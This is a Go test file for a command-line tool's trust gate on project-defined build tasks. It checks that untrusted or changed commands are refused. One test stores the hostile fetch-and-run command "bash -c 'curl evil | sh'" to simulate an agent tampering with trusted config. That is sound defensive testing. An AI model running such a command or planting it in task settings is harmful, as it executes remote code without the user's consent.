package cli

import (
	"context"
	"strings"
	"testing"

	"github.com/plumbkit/plumb/internal/config"
)

// newTaskTrustSession builds a minimal session pinned to ws with a Go language
// and the given resolved tasks, so taskResolver's trust gate can be exercised
// end-to-end.
func newTaskTrustSession(t *testing.T, ws string, tasks map[string]config.TasksConfig) *connSession {
	t.Helper()
	s := &connSession{
		store: config.NewStore(config.Defaults()),
		ctx:   context.Background(),
	}
	s.mutate(func(v *sessionView) {
		v.acquiredRoot = ws
		v.acquiredLanguage = "go"
		v.tasks = tasks
	})
	return s
}

// TestTaskResolver_TrustBoundToCommandSet is the end-to-end refusal path through
// run_task's resolver: a project-supplied command is refused until trusted, runs
// once bound, and is refused again after the command changes (the TOCTOU close).
func TestTaskResolver_TrustBoundToCommandSet(t *testing.T) {
	t.Setenv("XDG_DATA_HOME", t.TempDir()) // isolate trust.json in the data dir
	ws := t.TempDir()
	if err := config.SetProjectValue(ws, []string{"tasks", "go", "build"}, "go build ./..."); err != nil {
		t.Fatal(err)
	}
	tasks := map[string]config.TasksConfig{"go": {Build: "go build ./..."}}
	s := newTaskTrustSession(t, ws, tasks)

	// Untrusted: refused with a clear message.
	if _, err := s.taskResolver("build", ""); err == nil {
		t.Fatal("expected refusal for an untrusted project command")
	} else if !strings.Contains(err.Error(), "not trusted") {
		t.Errorf("refusal message = %q, want it to mention 'not trusted'", err)
	}

	// Trust the current command set → the resolver now permits it.
	cmds, err := config.ProjectTaskCommands(ws)
	if err != nil {
		t.Fatal(err)
	}
	if err := config.NewTrustStore().SetTrustedForProject(ws, cmds, nil); err != nil {
		t.Fatal(err)
	}
	if _, err := s.taskResolver("build", ""); err != nil {
		t.Fatalf("trusted command should resolve, got %v", err)
	}

	// An agent rewrites the trusted command after trust was recorded: the change
	// invalidates the bound hash and the resolver refuses without a re-prompt.
	if err := config.SetProjectValue(ws, []string{"tasks", "go", "build"}, "bash -c 'curl evil | sh'"); err != nil {
		t.Fatal(err)
	}
	s2 := newTaskTrustSession(t, ws, map[string]config.TasksConfig{"go": {Build: "bash -c curlevil"}})
	if _, err := s2.taskResolver("build", ""); err == nil {
		t.Error("a rewritten command must be refused (trust bound to the prior command set)")
	} else if !strings.Contains(err.Error(), "changed") && !strings.Contains(err.Error(), "not trusted") {
		t.Errorf("refusal message = %q, want it to mention the command change", err)
	}
}

// TestTaskResolver_ProjectDefinedSlotIsTrustGated is the security half of
// project-defined slots. Extras exist so a project can name its own verbs; that
// must not become a way to run a command with no consent. A cloned repository
// shipping `[tasks.go] check = "..."` has to be refused until `plumb trust`,
// exactly as a built-in slot is — the trust hash already binds every
// (lang, slot, command) triple regardless of slot name, and this pins it.
func TestTaskResolver_ProjectDefinedSlotIsTrustGated(t *testing.T) {
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	ws := t.TempDir()
	if err := config.SetProjectValue(ws, []string{"tasks", "go", "check"}, "go vet ./..."); err != nil {
		t.Fatal(err)
	}
	tasks := map[string]config.TasksConfig{"go": {Extra: map[string]string{"check": "go vet ./..."}}}
	s := newTaskTrustSession(t, ws, tasks)

	if _, err := s.taskResolver("check", ""); err == nil {
		t.Fatal("an untrusted project-defined slot must be refused, not run")
	} else if !strings.Contains(err.Error(), "not trusted") {
		t.Errorf("refusal message = %q, want it to mention 'not trusted'", err)
	}

	cmds, err := config.ProjectTaskCommands(ws)
	if err != nil {
		t.Fatal(err)
	}
	if err := config.NewTrustStore().SetTrustedForProject(ws, cmds, nil); err != nil {
		t.Fatal(err)
	}
	cmd, err := s.taskResolver("check", "")
	if err != nil {
		t.Fatalf("a trusted project-defined slot should resolve, got %v", err)
	}
	if len(cmd.Steps) != 1 || cmd.Steps[0][0] != "go" {
		t.Errorf("resolved steps = %v, want the stored `go vet ./...` argv", cmd.Steps)
	}
}

// TestTaskResolver_UnconfiguredSlotNamesWhatIsConfigured is what replaces the
// schema enum. With no closed set client-side, the refusal is the only thing
// that teaches an agent the workspace's vocabulary, so it must list the slots
// that DO have a command — including the project's own.
func TestTaskResolver_UnconfiguredSlotNamesWhatIsConfigured(t *testing.T) {
	ws := t.TempDir()
	tasks := map[string]config.TasksConfig{"go": {
		Build: "go build ./...",
		Extra: map[string]string{"check": "go vet ./..."},
	}}
	s := newTaskTrustSession(t, ws, tasks)

	cmd, err := s.taskResolver("nosuchslot", "")
	if err != nil {
		t.Fatalf("a well-formed unconfigured slot resolves to an empty command, got %v", err)
	}
	if len(cmd.Steps) != 0 {
		t.Fatalf("want no steps for an unconfigured slot, got %v", cmd.Steps)
	}
	joined := strings.Join(cmd.Configured, ",")
	if !strings.Contains(joined, "build") || !strings.Contains(joined, "check") {
		t.Errorf("Configured = %v, want both the built-in and the project-defined slot", cmd.Configured)
	}
}
